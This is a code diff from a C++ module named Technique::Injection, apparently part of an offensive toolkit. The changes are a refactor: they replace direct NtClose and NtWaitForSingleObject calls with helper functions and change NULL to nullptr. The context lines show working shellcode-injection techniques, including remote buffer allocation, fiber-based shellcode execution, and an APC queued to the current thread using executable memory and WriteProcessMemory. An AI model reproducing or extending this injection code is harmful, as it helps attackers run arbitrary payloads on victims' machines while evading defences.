@@ -27,7 +27,7 @@ namespace Technique::Injection
         );
         if (!remoteBuffer)
         {
-            pProcs->lpNtClose(hProcess);
+            System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
 
@@ -46,7 +46,7 @@ namespace Technique::Injection
                 0,
                 MEM_RELEASE
             );
-            pProcs->lpNtClose(hProcess);
+            System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
 
@@ -65,14 +65,14 @@ namespace Technique::Injection
                 0,
                 MEM_RELEASE
             );
-            pProcs->lpNtClose(hProcess);
+            System::Handle::HandleClose(pProcs, hProcess);
             return FALSE;
         }
 
-        pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);
+        System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr);
 
-        pProcs->lpNtClose(hProcess);
-        pProcs->lpNtClose(hThread);
+        System::Handle::HandleClose(pProcs, hProcess);
+        System::Handle::HandleClose(pProcs, hThread);
 
         return TRUE;
     }
@@ -82,7 +82,7 @@ namespace Technique::Injection
     BOOL ShellcodeExecutionViaFibers(Procs::PPROCS pProcs, const std::vector<BYTE>& shellcode)
     {
         // Convert the current thread into a fiber.
-        PVOID mainFiber = ConvertThreadToFiber(NULL);
+        PVOID mainFiber = ConvertThreadToFiber(nullptr);
 
         LPVOID scAddr = VirtualAlloc(
             NULL,
@@ -109,8 +109,8 @@ namespace Technique::Injection
             "NtTestAlert"
         ));
 
-        LPVOID scAddr = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        WriteProcessMemory(GetCurrentProcess(), scAddr, shellcode.data(), shellcode.size(), NULL);
+        LPVOID scAddr = VirtualAlloc(nullptr, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory(GetCurrentProcess(), scAddr, shellcode.data(), shellcode.size(), nullptr);
 
         PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)scAddr;
         QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), 0);
